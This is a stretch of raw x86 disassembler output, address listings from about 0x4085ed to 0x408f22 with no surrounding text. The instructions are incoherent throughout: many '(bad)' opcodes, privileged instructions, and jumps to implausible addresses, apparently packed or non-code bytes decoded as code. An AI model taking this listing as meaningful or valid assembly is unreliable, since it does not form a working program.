  4085ed:	call   FWORD PTR [ebp+0xf62b37]
	...
  408603:	add    BYTE PTR ds:0x23683890,cl
  408609:	push   esi
  40860a:	ret    0x97ff
  40860d:	sbb    eax,0x88700003
  408612:	scas   al,BYTE PTR es:[edi]
  408613:	pop    es
  408614:	fmul   DWORD PTR [edx-0x461800ca]
  40861a:	lods   eax,DWORD PTR ds:[esi]
  40861b:	sti    
  40861c:	fistp  QWORD PTR [ebx]
  40861e:	or     ebp,eax
  408620:	inc    ebx
  408621:	cmp    BYTE PTR [eax],0xff
  408624:	mov    ecx,0x1cfffedc
  408629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40862a:	xor    DWORD PTR es:[edx+esi*8-0x444800d1],0xf140fbbd
  408636:	lods   eax,DWORD PTR ds:[esi]
  408637:	(bad)  
  408639:	jae    0x408642
  40863b:	call   0x43fb39
  408640:	jmp    0x408648
  408642:	sub    DWORD PTR [eax],ecx
  408644:	jne    0x4085c6
  408646:	jmp    0xac88764e
  40864b:	cmp    esi,eax
  40864d:	push   es
  40864e:	jmp    0xfd0b3556
  408653:	aaa    
  408654:	test   DWORD PTR [esi],0x9e67ade9
  40865a:	call   0xe8dee60c
  40865f:	xchg   BYTE PTR [ebp+0x7589393a],ch
  408665:	cmp    edx,esi
  408667:	aaa    
	...
  408678:	add    BYTE PTR [eax],al
  40867a:	inc    edi
  40867b:	xlat   BYTE PTR ds:[ebx]
  40867c:	aad    0xb1
  40867e:	inc    edi
  40867f:	xor    BYTE PTR [eax+edi*1+0x48],dl
  408683:	xor    al,BYTE PTR [ebx+0x4]
  408686:	lock sti 
  408688:	test   al,0xb0
  40868a:	icebp  
  40868b:	sbb    ebx,DWORD PTR [ecx+ecx*4]
  40868e:	jne    0x4086b3
  408690:	mov    dh,0x37
  408692:	pop    ss
  408693:	xlat   BYTE PTR ds:[ebx]
  408694:	jae    0x408617
  408696:	add    al,0x38
  408698:	sahf   
  408699:	aaa    
  40869a:	mov    al,ds:0xff141c2f
  40869f:	mov    ecx,0x5b762bdc
  4086a4:	xchg   BYTE PTR [edi],dh
  4086a6:	jns    0x408631
  4086a8:	jns    0x4086d9
  4086aa:	out    0x2f,eax
  4086ac:	loop   0x4086f1
  4086ae:	fs in  eax,0x69
  4086b1:	jns    0x408677
  4086b3:	aaa    
  4086b4:	data16 aaa 
  4086b6:	lock mov edx,0x2fc7abff
  4086bc:	inc    esi
  4086bd:	jbe    0x40867e
  4086bf:	jns    0x4086fe
  4086c1:	das    
  4086c2:	mov    bh,0x2f
  4086c4:	inc    esi
  4086c5:	jno    0x408667
  4086c7:	aaa    
  4086c8:	ds aaa 
  4086ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086cb:	mov    ecx,0x3fcbe0ff
  4086d0:	leave  
  4086d1:	fild   QWORD PTR cs:[edi]
  4086d4:	mov    ch,0x19
  4086d6:	fild   QWORD PTR [edi]
  4086d8:	call   DWORD PTR [ecx]
  4086da:	(bad)  
  4086db:	call   DWORD PTR ds:0x0
	...
  4086f0:	(bad)  
  4086f1:	leave  
  4086f2:	test   DWORD PTR [edx],0x5752f6c
  4086f8:	sbb    al,0xb3
  4086fa:	jns    0x4086e5
  4086fc:	repz cmp eax,0xd9f3e5c2
  408702:	mov    bh,ch
  408704:	jb     0x408750
  408706:	cld    
  408707:	push   ebx
  408708:	hlt    
  408709:	pushf  
  40870a:	pop    ss
  40870b:	fiadd  WORD PTR [eax-0x2ed217f9]
  408711:	das    
  408712:	jmp    DWORD PTR [eax+0x30]
  408715:	sub    ebp,DWORD PTR [eax-0x3f]
  408718:	sub    al,0xc6
  40871a:	(bad)  
  40871b:	mov    ebp,0x2828a220
  408720:	hlt    
  408721:	das    
  408722:	jne    0x408705
  408724:	retf   
  408725:	jmp    0x9f072e28
  40872a:	mul    eax
  40872c:	sub    al,0x2f
  40872e:	addr16 jmp 0x408724
  408731:	push   es
  408732:	or     BYTE PTR [esi-0x2517f8c0],0x26
  408739:	call   DWORD PTR cs:[ecx]
  40873c:	std    
  40873d:	lock inc eax
  40873f:	jmp    0xc0ad7b6a
  408744:	lods   al,BYTE PTR ds:[esi]
  408745:	cs (bad) 
  408747:	fdiv   st(3),st
  408749:	push   ds
  40874a:	add    BYTE PTR [esi-0x2],bl
  40874d:	sub    eax,0xc7b9f868
  408752:	inc    eax
	...
  408764:	add    BYTE PTR [eax],al
  408766:	icebp  
  408767:	push   es
  408768:	add    BYTE PTR [eax],al
  40876a:	sbb    ebp,esi
  40876c:	je     0x408776
  40876e:	inc    ecx
  40876f:	in     al,0xfd
  408771:	jmp    esi
  408773:	hlt    
  408774:	je     0x408772
  408776:	(bad)  
  408777:	jbe    0x408780
  408779:	call   0x3f2f29
  40877e:	rol    bh,0x3
  408781:	add    BYTE PTR [ecx+eax*4],bh
  408784:	in     al,dx
  408785:	call   FWORD PTR [esi+eax*1-0x18]
  408789:	hlt    
  40878a:	ret    0xfef4
  40878d:	or     ebx,DWORD PTR [ecx]
  40878f:	pop    esi
  408790:	cmp    BYTE PTR [eax-0x59],ch
  408793:	xor    BYTE PTR [eax+0x0],al
  408796:	jns    0x40877a
  408798:	mov    BYTE PTR [ebx+0x504ff456],ch
  40879e:	mov    eax,ds:0x67ef0002
  4087a3:	pop    ebx
  4087a4:	xor    edi,DWORD PTR [edx]
  4087a6:	or     BYTE PTR [ebx],al
  4087a8:	push   eax
  4087a9:	(bad)  
  4087aa:	in     al,dx
  4087ab:	cli    
  4087ac:	out    0x50,eax
  4087ae:	push   ebp
  4087af:	hlt    
  4087b0:	(bad)  
  4087b1:	pop    eax
  4087b2:	mov    cl,0x9
  4087b4:	add    bh,ch
  4087b6:	xchg   DWORD PTR [edx+0x38],ebx
  4087b9:	cmp    bl,al
  4087bb:	add    dl,BYTE PTR [eax-0x1]
  4087be:	fdiv   st(2),st
  4087c0:	out    0x3c,eax
  4087c2:	push   ebp
  4087c3:	hlt    
  4087c4:	(bad)  
  4087c5:	call   0x3f53bb
	...
  4087da:	add    BYTE PTR [eax],al
  4087dc:	mov    al,ds:0xfc0007c8
  4087e1:	jg     0x4087cf
  4087e3:	or     DWORD PTR [ebp-0xcff9612],0x11
  4087ea:	push   DWORD PTR [ebp-0x3f]
  4087ed:	loope  0x408778
  4087ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087f0:	es hlt 
  4087f2:	mov    BYTE PTR [ebp-0x10],al
  4087f5:	shr    DWORD PTR [ecx+0xb52b719],cl
  4087fb:	call   0xff754c85
  408800:	sbb    al,BYTE PTR [ecx]
  408802:	xor    eax,0x88c7e875
  408807:	call   DWORD PTR [edi-0x70e45624]
  40880d:	mov    cl,BYTE PTR [ebx]
  40880f:	call   0xff759485
  408814:	jg     0x4087a0
  408816:	aaa    
  408817:	(bad)  
  408818:	std    
  408819:	daa    
  40881a:	sub    esp,DWORD PTR [esp+edx*4+0x32c93504]
  408821:	and    eax,DWORD PTR [ebx]
  408823:	push   ebp
  408824:	imul   eax,DWORD PTR [ebx],0xffffff81
  408827:	les    edx,FWORD PTR [esp+ebx*1-0x52]
  40882b:	or     ebx,DWORD PTR [eax-0x40]
  40882e:	push   0x433847ff
  408833:	pcmpeqb mm0,QWORD PTR [eax-0x590ffffd]
  40883a:	mov    ebp,0x13c273fb
	...
  40884f:	add    BYTE PTR [eax],al
  408851:	add    BYTE PTR [ebp+ebx*1+0x75007534],bl
  408858:	scas   al,BYTE PTR es:[edi]
  408859:	sti    
  40885a:	or     BYTE PTR [eax+0x69],cl
  40885d:	dec    DWORD PTR [edi]
  40885f:	mov    dh,0xbd
  408861:	sti    
  408862:	cwde   
  408863:	(bad)  
  408864:	stc    
  408865:	inc    eax
  408866:	lock xchg esp,eax
  408868:	scas   al,BYTE PTR es:[edi]
  408869:	sti    
  40886a:	or     BYTE PTR [eax+ebp*2-0x53f11001],ah
  408871:	jmp    edi
  408873:	jge    0x4088ea
  408875:	push   eax
  408876:	fild   QWORD PTR [ebx]
  408878:	or     ebp,eax
  40887a:	mov    bl,0x66
  40887c:	xor    al,0xff
  40887e:	fadd   DWORD PTR [edi]
  408880:	cmp    eax,0xd12cc75d
  408885:	jl     0x408881
  408887:	(bad)
  40888a:	cmp    eax,0x599d412b
  40888f:	sub    al,0x46
  408891:	ror    DWORD PTR [edi],cl
  408893:	push   es
  408894:	jmp    0x3617e6bd
  408899:	scas   al,BYTE PTR es:[edi]
  40889a:	out    dx,eax
  40889b:	push   ds
  40889c:	mov    ecx,DWORD PTR [ebx-0x71]
  40889f:	sub    al,0x11
  4088a1:	jo     0x4088f1
  4088a3:	sub    al,0x1e
  4088a5:	stos   DWORD PTR es:[edi],eax
  4088a6:	or     al,0xf1
  4088a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088a9:	add    esi,DWORD PTR [edi-0x4e]
  4088ac:	or     al,0x2b
  4088ae:	mov    ch,0x60
  4088b0:	push   es
  4088b1:	xor    al,0xc0
  4088b3:	sahf   
  4088b4:	call   0x4088bc
	...
  4088c5:	add    BYTE PTR [eax],al
  4088c7:	add    BYTE PTR [edi+0x6d],cl
  4088ca:	cdq    
  4088cb:	xor    al,0xdd
  4088cd:	inc    BYTE PTR [eax]
  4088cf:	cmp    BYTE PTR [eax],0x2c
  4088d2:	out    0x1c,al
  4088d4:	bound  esp,QWORD PTR [ebp-0x22]
  4088d7:	xor    ecx,eax
  4088d9:	mov    WORD PTR [ebx],ss
  4088db:	lds    esi,FWORD PTR [edi]
  4088dd:	sub    eax,0xe3183054
  4088e2:	xchg   edx,eax
  4088e3:	xor    esp,DWORD PTR [edi]
  4088e5:	xlat   BYTE PTR ds:[ebx]
  4088e6:	push   eax
  4088e7:	add    eax,0xd4771bf0
  4088ec:	push   ss
  4088ed:	mov    dl,0xe0
  4088ef:	sbb    edx,DWORD PTR [eax+0x1833a63e]
  4088f5:	mov    dh,0x46
  4088f7:	xor    edi,edi
  4088f9:	sub    ebx,DWORD PTR [eax+esi*1]
  4088fc:	or     BYTE PTR [esi+0x3def3346],bl
  408902:	stos   DWORD PTR es:[edi],eax
  408903:	add    al,dh
  408905:	shl    DWORD PTR [ecx+0x20],1
  408908:	jae    0x40894c
  40890a:	add    BYTE PTR [ebp+0x76],dh
  40890d:	sub    ebp,DWORD PTR [ecx-0x2d]
  408910:	add    dh,BYTE PTR [edx+0x68475107]
  408916:	call   FWORD PTR [esi+0x3d]
  408919:	ret    0xc3fb
  40891c:	repz mov al,ds:0x3694e19
  408922:	call   0xff6c6c32
  408927:	shl    ebx,cl
  408929:	mov    al,ds:0x3622
	...
  40893e:	pop    ecx
  40893f:	add    ebp,eax
  408941:	xlat   BYTE PTR ds:[ebx]
  408942:	ret    0xff2b
  408945:	xchg   ebx,eax
  408946:	repz mov al,ds:0x3391e1b
  40894c:	call   0xff6c4c34
  408951:	sbb    esi,0x85e940f0
  408957:	or     eax,0x235b74ff
  40895c:	sti    
  40895d:	mul    DWORD PTR [edx]
  40895f:	sub    al,0x68
  408961:	xor    bl,BYTE PTR [esi-0x3a]
  408964:	call   DWORD PTR [edx+0x4f]
  408967:	sub    al,0x75
  408969:	icebp  
  40896a:	fistp  DWORD PTR [edx]
  40896c:	(bad)  
  40896d:	(bad)  
  40896e:	add    bl,BYTE PTR [edi+0x2b3513ba]
  408974:	imul   esp,ebp,0xd107b1e2
  40897a:	shr    BYTE PTR [edi+edi*8],0xb6
  40897e:	loop   0x408931
  408980:	sti    
  408981:	scas   al,BYTE PTR es:[edi]
  408982:	dec    eax
  408983:	add    ebp,eax
  408985:	sbb    ecx,DWORD PTR [edi-0x4a4f00d5]
  40898b:	add    al,BYTE PTR [eax]
  40898d:	cmp    al,0x77
  40898f:	sbb    al,BYTE PTR [ecx-0xcdf45b]
  408995:	add    BYTE PTR [esi-0x79],ch
  408998:	inc    ebp
  408999:	cld    
  40899a:	stc    
  40899b:	cmc    
  40899c:	je     0x4089ae
  40899e:	pop    esi
  40899f:	outs   dx,DWORD PTR ds:[esi]
  4089a0:	or     ebp,eax
	...
  4089b2:	add    BYTE PTR [eax],al
  4089b4:	sbb    DWORD PTR [esi-0x1],0xec6c2ff
  4089bb:	test   DWORD PTR [esi+0x6000003],edx
  4089c1:	aas    
  4089c2:	test   DWORD PTR [eax],0xc7000699
  4089c8:	push   esp
  4089c9:	repnz inc BYTE PTR [edi]
  4089cc:	mov    DWORD PTR [esi],eax
  4089ce:	push   0x0
  4089d0:	mov    bl,0x6
  4089d2:	push   0x0
  4089d4:	mov    bl,0x6
  4089d6:	lea    eax,[ebp-0x1b]
  4089d9:	push   ebp
  4089da:	mov    WORD PTR [ebp-0x1131b],es
  4089e0:	cmp    ebp,esi
  4089e2:	je     0x4089dc
  4089e4:	(bad)  
  4089e5:	outs   dx,BYTE PTR ds:[esi]
  4089e6:	sti    
  4089e7:	call   0x3fe84f
  4089ec:	(bad)  
  4089ed:	(bad)  
  4089ee:	jae    0x4089f5
  4089f0:	lock sub eax,DWORD PTR [eax]
  4089f3:	add    BYTE PTR [ecx-0x72],bl
  4089f6:	(bad)  [eax]
  4089f8:	sbb    BYTE PTR [ebx],al
  4089fa:	push   DWORD PTR [ebp+0x39]
  4089fd:	push   cs
  4089fe:	sub    eax,0x4ff81ea9
  408a03:	mov    ebp,DWORD PTR [ecx-0x56]
  408a06:	test   ah,dh
  408a08:	data16 clc 
  408a0a:	(bad)  
  408a0b:	push   eax
  408a0c:	sti    
  408a0d:	or     bl,BYTE PTR ds:0x88f85ea9
  408a13:	test   DWORD PTR [ecx-0x10],ecx
  408a16:	(bad)  
  408a17:	inc    DWORD PTR [eax]
	...
  408a29:	add    BYTE PTR [ecx+0x74],ah
  408a2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a2d:	call   FWORD PTR [esi-0x77]
  408a30:	jmp    DWORD PTR [edi-0x10]
  408a33:	xor    eax,0x78f040ec
  408a38:	ja     0x408a2a
  408a3a:	fild   WORD PTR [eax+0x1c65ff31]
  408a40:	sbb    esi,DWORD PTR [esi-0x78]
  408a43:	mov    al,0x30
  408a45:	mov    DWORD PTR [ebp-0x55],esi
  408a48:	cmp    bh,bh
  408a4a:	(bad)  
  408a4b:	push   ebp
  408a4c:	add    ebp,DWORD PTR [eax+0x16]
  408a4f:	in     eax,0xc2
  408a51:	push   DWORD PTR [esi-0x5008cb76]
  408a57:	mov    eax,0xd7f47530
  408a5c:	int3   
  408a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a5e:	lahf   
  408a5f:	call   0xe8c90fde
  408a64:	xor    bh,bh
  408a66:	jae    0x408a02
  408a68:	pop    ds
  408a69:	test   DWORD PTR [edi-0x3f8bfc20],0x87000397
  408a73:	rcr    DWORD PTR [ebx+0x35f2ae1],1
  408a79:	call   FWORD PTR [ebp+0x5fff3913]
  408a7f:	sub    BYTE PTR [esi+0x3b044807],dh
  408a85:	dec    DWORD PTR [edi-0x79]
  408a88:	add    al,BYTE PTR [eax]
  408a8a:	push   edi
  408a8b:	popa   
  408a8c:	fwait
  408a8d:	jmp    0x408a8f
	...
  408a9f:	add    dl,bh
  408aa1:	fiadd  WORD PTR [ebx]
  408aa3:	(bad)  
  408aa4:	jge    0x408ae9
  408aa6:	cmp    bh,bh
  408aa8:	das    
  408aa9:	cmp    BYTE PTR [esi+0x3a8c1807],dh
  408aaf:	call   FWORD PTR [edi]
  408ab1:	pushf  
  408ab2:	ins    DWORD PTR es:[edi],dx
  408ab3:	call   0x70fad7
  408ab8:	test   BYTE PTR [edi],ch
  408aba:	fwait
  408abb:	inc    DWORD PTR [edi]
  408abd:	push   es
  408abe:	xchg   esi,eax
  408abf:	jno    0x408a49
  408ac1:	and    al,0xe3
  408ac3:	ret    0x27f7
  408ac6:	pop    esp
  408ac7:	sbb    esp,edi
  408ac9:	sub    BYTE PTR [esi-0x6f00a2d0],cl
  408acf:	jne    0x408a7a
  408ad1:	sub    BYTE PTR [esi-0x65],bh
  408ad4:	lock push es
  408ad6:	xchg   BYTE PTR [ecx+0x58],dh
  408ad9:	sbb    esi,DWORD PTR [ebx-0x63d6383e]
  408adf:	sbb    eax,edi
  408ae1:	sub    BYTE PTR [esi+0x30],bl
  408ae4:	cmp    eax,0xb98d40ff
  408ae9:	sub    BYTE PTR [esi+0x30],cl
  408aec:	pop    ebp
  408aed:	sbb    edi,DWORD PTR [esi]
  408aef:	xor    BYTE PTR [edi-0x6898d6e1],bl
  408af5:	sub    BYTE PTR [esi],dh
  408af7:	jbe    0x408a91
  408af9:	xor    BYTE PTR [esi],ch
  408afb:	xor    BYTE PTR [eax+0x7f304d72],bl
  408b01:	sub    BYTE PTR [ebx+esi*1+0x0],dl
	...
  408b15:	add    BYTE PTR [edi+0x28],bh
  408b18:	push   ss
  408b19:	xor    ch,ah
  408b1b:	cli    
  408b1c:	or     eax,0x3d1eefb6
  408b21:	xor    DWORD PTR [edi+0x28],ebx
  408b24:	(bad)  
  408b25:	jne    0x408b87
  408b27:	xor    dh,dh
  408b29:	das    
  408b2a:	pop    eax
  408b2b:	mov    es,WORD PTR [ebp+0x30]
  408b2e:	inc    edi
  408b2f:	sub    BYTE PTR [esp+ebp*1],ch
  408b32:	dec    ecx
  408b33:	aas    
  408b34:	fild   QWORD PTR [edi]
  408b36:	aaa    
  408b37:	sub    BYTE PTR [eax+esi*1+0x18],bl
  408b3b:	and    al,0x57
  408b3d:	add    al,0xf0
  408b3f:	cmp    eax,0xd1f000ab
  408b44:	jno    0x408b66
  408b46:	pop    ss
  408b47:	mov    dl,0xff
  408b49:	in     al,0xeb
  408b4b:	cmp    eax,0xfbd7aea8
  408b50:	mov    edi,0xf5a00d1d
  408b55:	jecxz  0x408b83
  408b57:	sub    BYTE PTR [edi-0x7f],cl
  408b5a:	mov    esi,0xbc8eff5f
  408b5f:	mov    bh,0x67
  408b61:	jmp    0x11fea359
  408b66:	adc    ch,ch
  408b68:	inc    eax
  408b69:	jmp    0xe1b5b411
  408b6e:	jmp    0x408b51
  408b70:	enter  0xf66,0xcf
  408b74:	addr16 call 0xc1fea36d
	...
  408b8a:	add    BYTE PTR [eax],al
  408b8c:	paddsw mm0,QWORD PTR [eax-0x17]
  408b90:	ret    
  408b91:	sub    BYTE PTR [ebp-0xf],dh
  408b94:	sti    
  408b95:	adc    eax,0x1ec73ec9
  408b9a:	cmp    eax,0xc927df8d
  408b9f:	sub    eax,DWORD PTR [edi+eiz*1-0x7c2f8dac]
  408ba6:	les    ebx,FWORD PTR ds:0xe969d09e
  408bac:	mov    DWORD PTR [edi+edi*8],ecx
  408baf:	xchg   esp,eax
  408bb0:	imul   ebx,DWORD PTR [edi],0x5d
  408bb3:	dec    eax
  408bb4:	movaps xmm1,XMMWORD PTR [ecx+0x357c07a4]
  408bbb:	outs   dx,DWORD PTR ds:[esi]
  408bbc:	sub    al,0xc6
  408bbe:	jmp    DWORD PTR [ecx+0x41]
  408bc1:	jge    0x408beb
  408bc3:	sub    ah,dh
  408bc5:	xchg   BYTE PTR [edi],bh
  408bc7:	jmp    0xe9fc0f02
  408bcc:	repz push es
  408bce:	push   0xffc619b6
  408bd3:	(bad)  
  408bd4:	dec    DWORD PTR [edx]
  408bd6:	mov    al,0x76
  408bd8:	or     DWORD PTR [ebx],eax
  408bda:	or     eax,eax
  408bdc:	int    0x68
  408bde:	aas    
  408bdf:	add    BYTE PTR [ecx],0x3
  408be2:	je     0x408f76
  408be8:	mov    ecx,0x183ad68a
  408bed:	or     ebp,eax
  408bef:	in     eax,dx
	...
  408c00:	add    BYTE PTR [eax],al
  408c02:	std    
  408c03:	or     al,BYTE PTR [eax]
  408c05:	pop    edx
  408c06:	retf   0x4fc8
  408c09:	call   0x3f334e
  408c0e:	jmp    0xd940f34d
  408c13:	add    eax,0x302b68be
  408c18:	inc    eax
  408c19:	add    BYTE PTR [ecx-0xb],bh
  408c1c:	je     0x408c26
  408c1e:	xor    DWORD PTR [eax+0x5236ffc8],edx
  408c24:	add    DWORD PTR [bx+di-0x41fb],ecx
  408c29:	push   0x403025
  408c2e:	imul   esi,ebp,0x8c310874
  408c34:	enter  0xd6ff,0x1
  408c38:	mov    dl,0xa3
  408c3a:	(bad)  
  408c3b:	hlt    
  408c3c:	jmp    0x5941:0x39e57143
  408c43:	cmp    eax,0x9df41e7
  408c48:	add    BYTE PTR [ebx],cl
  408c4a:	or     DWORD PTR [esi+0x33],ebx
  408c4d:	push   esi
  408c4e:	icebp  
  408c4f:	ins    DWORD PTR es:[edi],dx
  408c50:	lods   al,BYTE PTR ds:[esi]
  408c51:	call   DWORD PTR [esi+0x39]
  408c54:	dec    edi
  408c55:	push   0xbeef0a49
  408c5a:	mov    eax,ds:0xf04139e8
  408c5f:	das    
  408c60:	sar    esi,cl
  408c62:	popf   
  408c63:	daa    
  408c64:	sbb    edx,DWORD PTR [ebp+0x0]
	...
  408c77:	add    BYTE PTR [eax],ch
  408c79:	dec    ebp
  408c7a:	sub    eax,0x32e8858
  408c7f:	out    dx,eax
  408c80:	dec    esi
  408c81:	enter  0x3a1f,0xb1
  408c85:	das    
  408c86:	sar    esi,cl
  408c88:	test   DWORD PTR [edi],edx
  408c8a:	sbb    eax,DWORD PTR [ecx+0x28]
  408c8d:	test   DWORD PTR ds:0x2cd15de8,ebp
  408c93:	(bad)  
  408c94:	fld    TBYTE PTR [esi]
  408c96:	lds    edi,FWORD PTR [edi+0x1e]
  408c99:	xor    BYTE PTR [esi-0xf5bd107],dh
  408c9f:	mov    edi,0xff2c9c89
  408ca4:	(bad)  
  408ca5:	mov    eax,ds:0x1cf7385d
  408caa:	xchg   BYTE PTR [ebp-0x49],al
  408cad:	les    ebp,FWORD PTR [edx+ebp*2]
  408cb0:	or     bh,BYTE PTR [ebp-0xf67f84a]
  408cb6:	sub    eax,0xe0399fff
  408cbb:	(bad)  
  408cbc:	sbb    eax,0x8eb91b18
  408cc1:	fsubr  QWORD PTR [edx+ebp*2]
  408cc4:	in     al,0xf4
  408cc6:	mov    dh,0x7
  408cc8:	mov    BYTE PTR [ebp+ebp*1-0x4888801],bh
  408ccf:	cmp    dh,BYTE PTR [ecx-0x2acad3d1]
  408cd5:	inc    esi
  408cd6:	ret    0x5eff
  408cd9:	mov    ds:0xe7fa,al
	...
  408cee:	and    DWORD PTR [ebx],esp
  408cf0:	sub    al,0xff
  408cf2:	fsub   DWORD PTR [edi]
  408cf4:	call   0x1c87d39
  408cf9:	add    al,dh
  408cfb:	push   es
  408cfc:	imul   ebp,DWORD PTR [edi*4+0x2d0cd10e],0x9d2cd625
  408d07:	and    cl,dh
  408d09:	mov    dh,0xf7
  408d0b:	imul   esp,DWORD PTR cs:[ebx+0x17],0x25
  408d10:	push   ds
  408d11:	into   
  408d12:	cmp    BYTE PTR [eax-0x13],cl
  408d15:	add    ebx,DWORD PTR [ebp+0x3482bd91]
  408d1b:	ss sahf 
  408d1d:	sub    al,0xf7
  408d1f:	xchg   edx,eax
  408d20:	and    al,0x30
  408d22:	inc    eax
  408d23:	and    al,0x1c
  408d25:	adc    al,0xe7
  408d27:	call   0x3e8:0x9a361bdc
  408d2e:	jmp    0x408d76
  408d30:	out    dx,al
  408d31:	xchg   BYTE PTR [edx],dh
  408d33:	or     ecx,ebp
  408d35:	add    ebp,DWORD PTR [edi-0xffc8f36]
  408d3b:	push   es
  408d3c:	jmp    0x5e5bba85
  408d41:	add    al,0xf0
  408d43:	push   es
  408d44:	ret    
  408d45:	add    ebx,DWORD PTR [edx]
  408d47:	pop    es
  408d48:	ret    
  408d49:	add    ecx,DWORD PTR [edx]
  408d4b:	pop    es
  408d4c:	je     0x408d14
  408d4e:	mov    ds:0x866bb7,eax
	...
  408d63:	add    BYTE PTR [esp+ebx*1+0x24202c36],al
  408d6a:	mov    ah,0x2b
  408d6c:	jg     0x408d08
  408d6e:	and    al,0x1b
  408d70:	fcomp  DWORD PTR [ecx+0x46fb03e8]
  408d76:	popf   
  408d77:	push   es
  408d78:	pop    ecx
  408d79:	or     ch,bl
  408d7b:	add    esi,eax
  408d7d:	scas   al,BYTE PTR es:[edi]
  408d7e:	(bad)  es:[eax-0x4a01fa]
  408d85:	add    BYTE PTR cs:[edx-0x6600dc33],dh
  408d8c:	mov    eax,0x6c8d36
  408d91:	sbb    al,0xff
  408d93:	fiadd  WORD PTR [esi+esi*4-0x19]
  408d97:	add    dl,BYTE PTR [edx+0x7160ff23]
  408d9d:	pop    ss
  408d9e:	test   esi,0x8b812ecb
  408da4:	(bad)  [ebx]
  408da6:	push   0xffffffe9
  408da8:	imul   esi,edx,0x3a
  408dab:	sub    ah,dh
  408dad:	and    esi,DWORD PTR [ebp-0xdc3c67]
  408db3:	sahf   
  408db4:	mov    eax,ds:0x516de80f
  408db9:	and    al,0xff
  408dbb:	pusha  
  408dbc:	jno    0x408de8
  408dbe:	test   DWORD PTR [esi+0x10ffb10b],0xe940e0c3
	...
  408dd8:	add    BYTE PTR [eax],al
  408dda:	sbb    bl,BYTE PTR [edx-0x10]
  408ddd:	jbe    0x408dea
  408ddf:	and    al,0xff
  408de1:	fdivr  QWORD PTR [edi-0x247b96d5]
  408de7:	and    ecx,DWORD PTR [ecx-0xe3f794]
  408ded:	dec    esi
  408dee:	jle    0x408e13
  408df0:	addr16 test eax,0x3dffc686
  408df6:	add    DWORD PTR [edi],edx
  408df8:	div    DWORD PTR [esi]
  408dfa:	(bad)  [ebx]
  408dfc:	jne    0x408ddb
  408dfe:	fcmovnbe st,st(4)
  408e00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e01:	es retf 
  408e03:	lea    eax,[ebp-0xdbdcef]
  408e09:	xor    ebx,0xffffffae
  408e0c:	dec    eax
  408e0d:	shl    BYTE PTR [ebx+eiz*1],cl
  408e10:	inc    BYTE PTR [eax]
  408e12:	adc    al,0xdb
  408e14:	idiv   bh
  408e16:	dec    esi
  408e17:	lock je 0x408e26
  408e1a:	icebp  
  408e1b:	sbb    esp,DWORD PTR [edi+edi*8-0x237b5db2]
  408e22:	push   ss
  408e23:	lock dec BYTE PTR [ebp-0x9186c]
  408e2a:	ds aaa 
  408e2c:	addr16 pop ecx
  408e2e:	add    cl,BYTE PTR [edx-0x1]
  408e31:	(bad)  
  408e32:	xchg   esp,eax
  408e33:	xlat   BYTE PTR ds:[ebx]
  408e34:	idiv   bh
  408e36:	dec    esi
  408e37:	lock xor al,0x6d
  408e3a:	lock dec ecx
  408e3c:	jmp    edi
	...
  408e4e:	add    BYTE PTR [eax],al
  408e50:	sbb    DWORD PTR [esi-0x38fd0002],esp
  408e56:	jae    0x408e71
  408e58:	pop    edx
  408e59:	scas   eax,DWORD PTR es:[edi]
  408e5a:	fcomip st,st(7)
  408e5c:	jle    0x408e4b
  408e5e:	add    esi,DWORD PTR [ebp-0x27]
  408e61:	in     eax,dx
  408e62:	das    
  408e63:	pop    DWORD PTR [esi+ecx*8-0xa]
  408e67:	dec    DWORD PTR [esi+0x36]
  408e6a:	out    0xdd,eax
  408e6c:	cmp    ch,ch
  408e6e:	(bad)  
  408e6f:	jmp    0x408e16
  408e71:	and    DWORD PTR [edi-0x18c9388c],edi
  408e77:	sar    DWORD PTR [eax-0x13],1
  408e7a:	inc    bh
  408e7c:	adc    al,0xce
  408e7e:	idiv   bh
  408e80:	cs idiv edi
  408e83:	dec    DWORD PTR [ecx-0x392f7b61]
  408e89:	in     al,dx
  408e8a:	(bad)  
  408e8b:	push   eax
  408e8c:	mov    cl,0x82
  408e8e:	cmp    al,BYTE PTR [ecx-0x77]
  408e91:	in     eax,dx
  408e92:	mov    ah,0xf0
  408e94:	(bad)  
  408e95:	in     al,dx
  408e96:	(bad)  
  408e97:	inc    DWORD PTR [edx+ebx*1-0x2c0f3a19]
  408e9e:	sub    edi,edi
  408ea0:	imul   ebp,DWORD PTR [ebx+0x957f74e],0x1954bd86
  408eaa:	sub    edi,edi
  408eac:	lock sub BYTE PTR [edi-0x65],bh
  408eb0:	lock das 
  408eb2:	add    eax,DWORD PTR [ebx+0x0]
	...
  408ec4:	add    BYTE PTR [eax],al
  408ec6:	jne    0x408f04
  408ec8:	xor    edi,edi
  408eca:	das    
  408ecb:	xor    al,bh
  408ecd:	xor    DWORD PTR [esi+0x30],0x3
  408ed1:	add    BYTE PTR [ebx-0x6d],dh
  408ed4:	sbb    al,0xf7
  408ed6:	pop    ss
  408ed7:	dec    ecx
  408ed8:	add    al,0xf
  408eda:	je     0x408e8b
  408edc:	add    eax,DWORD PTR [eax]
  408ede:	lock (bad) 
  408ee0:	adc    eax,DWORD PTR [eax]
  408ee2:	lss    ebp,FWORD PTR [eax]
  408ee5:	jne    0x408ecf
  408ee7:	ja     0x408f11
  408ee9:	popf   
  408eea:	out    dx,eax
  408eeb:	sub    BYTE PTR [ecx],0xb5
  408eee:	aam    0x80
  408ef0:	sub    edi,edi
  408ef2:	(bad)  
  408ef4:	sti    
  408ef5:	out    0x40,eax
  408ef7:	stos   BYTE PTR es:[edi],al
  408ef8:	sub    bh,bh
  408efa:	iret   
  408efb:	ficomp DWORD PTR [ebx]
  408efd:	test   edi,0xe8752898
  408f03:	xchg   esi,eax
  408f05:	popf   
  408f06:	mov    bh,0xa8
  408f08:	sub    BYTE PTR [ebp-0xd7476c],dh
  408f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f0f:	inc    edx
  408f10:	sti    
  408f11:	out    0xe4,eax
  408f13:	mov    cl,0x28
  408f15:	call   DWORD PTR [edi-0x7008b45e]
  408f1b:	loopne 0x408f45
  408f1d:	jne    0x408f17
  408f1f:	(bad)  
  408f20:	aas    
  408f21:	popf   
  408f22:	jg     0x408f14
